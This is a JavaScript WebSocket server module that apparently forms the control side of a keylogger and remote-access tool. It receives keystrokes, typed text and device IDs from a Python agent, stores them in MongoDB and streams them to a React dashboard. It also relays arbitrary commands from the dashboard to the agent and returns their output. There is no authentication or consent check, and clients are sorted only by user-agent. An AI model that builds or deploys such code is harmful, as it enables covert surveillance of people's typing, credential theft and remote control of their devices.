const WebSocket = require("ws");

const keystrokeController = require("./keystrokeController");
const commandController = require("./commandController");

class WebSocketController {
    constructor(server) {
        this.wss = new WebSocket.Server({ server });

        this.browserClients = new Set();
        this.pythonClient = null;
    }

    init() {
        this.wss.on("connection", (ws, req) => {
            this.handleConnection(ws, req);
        });
    }

    handleConnection(ws, req) {
        const isBrowser = this.isBrowser(
            req.headers["user-agent"] || ""
        );

        if (isBrowser) {
            this.handleBrowser(ws);
        } else {
            this.handlePythonClient(ws);
        }

        ws.on("close", () => {
            if (ws === this.pythonClient) {
                this.pythonClient = null;
                commandController.setPythonClient(null);
            } else {
                this.browserClients.delete(ws);
            }
        });
    }

    isBrowser(userAgent) {
        return (
            userAgent.includes("Mozilla") ||
            userAgent.includes("Chrome")
        );
    }

    // =========================
    // BROWSER / REACT CLIENT
    // =========================

    handleBrowser(ws) {
        this.browserClients.add(ws);

        ws.on("message", (data) => {
            try {
                const msg = JSON.parse(data);

                // React → Python command
                if (
                    msg.type === "send_command" &&
                    this.pythonClient
                ) {
                    this.pythonClient.send(
                        JSON.stringify({
                            type: "command",
                            command: msg.command,
                        })
                    );
                }
            } catch (err) {
                console.error(
                    "Browser WebSocket error:",
                    err.message
                );
            }
        });
    }

    // =========================
    // PYTHON CLIENT
    // =========================

    handlePythonClient(ws) {
        this.pythonClient = ws;

        // Share Python WebSocket with command controller
        commandController.setPythonClient(ws);

        ws.on("message", async (data) => {
            try {
                const event = JSON.parse(data);

                // =========================
                // COMMAND OUTPUT
                // =========================

                if (event.type === "cmd_output") {
                    const commandData = {
                        type: "cmd_output",
                        data: event.data,
                        time: new Date().toLocaleTimeString(),
                    };

                    // Send command output to controller
                    // Controller will later save it to MongoDB
                    await commandController.saveCommand(
                        commandData
                    );

                    // Send real-time output to React
                    this.broadcast(commandData);

                    return;
                }

                // =========================
                // ACTIVITY / KEYSTROKE
                // =========================

                const activityData = {
                    deviceId:
                        event.deviceId || "unknown-device",

                    eventType:
                        event.type || "activity",

                    key:
                        event.key || "",

                    text:
                        event.current_text ||
                        event.text ||
                        "",

                    time: new Date().toLocaleTimeString(),
                };

                // Send activity data to controller
                // Controller will later save it to MongoDB
                await keystrokeController.saveActivity(
                    activityData
                );

                // Send real-time activity to React
                this.broadcast({
                    type: "keystroke",
                    ...activityData,
                });

            } catch (err) {
                console.error(
                    "Python WebSocket error:",
                    err.message
                );
            }
        });
    }

    // =========================
    // BROADCAST TO BROWSERS
    // =========================

    broadcast(data) {
        const message = JSON.stringify(data);

        this.browserClients.forEach((client) => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(message);
            }
        });
    }
}

module.exports = WebSocketController;